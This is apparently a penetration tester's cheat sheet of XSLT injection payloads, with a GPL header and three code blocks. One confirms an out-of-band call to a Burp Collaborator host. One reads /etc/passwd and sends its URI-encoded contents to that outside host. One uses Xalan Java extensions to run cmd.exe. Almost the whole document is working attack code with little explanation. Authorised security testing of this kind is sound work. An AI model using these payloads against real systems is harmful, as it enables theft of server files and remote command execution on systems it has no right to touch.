<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# XSLT

## Basic test case
~~~
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="doc">
    <xsl:variable name="attackerUrl" select="'http://1qsg2yhdfz4np3uerviimk3hk8qyen.burpcollaborator.net/'"/>
    <xsl:value-of select="unparsed-text($attackerUrl)"/>
  </xsl:template>
</xsl:stylesheet>
~~~

## Read a file
~~~
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="doc">
    <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
    <xsl:variable name="escaped" select="encode-for-uri($file)"/>
    <xsl:variable name="attackerUrl" select="'http://1qsg2yhdfz4np3uerviimk3hk8qyen.burpcollaborator.net/'"/>
    <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
    <xsl:value-of select="unparsed-text($exploitUrl)"/>
  </xsl:template>
</xsl:stylesheet>
~~~

## Execute a command
~~~
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
 xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
 exclude-result-prefixes= "rt ob">
 <xsl:template match="/">
   <xsl:variable name="runtimeObject" select="rt:getRuntime()"/>
   <xsl:variable name="command"
     select="rt:exec($runtimeObject, &apos;c:\Windows\system32\cmd.exe&apos;)"/>
   <xsl:variable name="commandAsString" select="ob:toString($command)"/>
   <xsl:value-of select="$commandAsString"/>
 </xsl:template>
</xsl:stylesheet>
~~~